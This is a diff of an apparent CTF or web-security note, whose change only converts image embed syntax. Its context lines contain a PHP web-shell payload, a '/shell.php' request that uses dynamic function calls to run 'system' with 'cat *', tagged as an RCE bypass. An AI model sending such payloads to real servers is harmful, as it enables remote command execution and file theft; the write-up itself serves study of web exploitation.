@@ -1,4 +1,4 @@
-![[Pasted image 20230501145553.png|800]]
+![](<./img/Pasted image 20230501145553.png>)
 
 ```
 /shell.php
@@ -44,6 +44,6 @@ $str1($str2);
 /shell.php?a=Exception&b=systemcat *&c=getMessage&d=0&e=6&f=6&g=5
 ```
 
-![[Pasted image 20230501145514.png|800]]
+![](<./img/Pasted image 20230501145514.png>)
 
 #Web #RCE #PHP #shell #bypass 
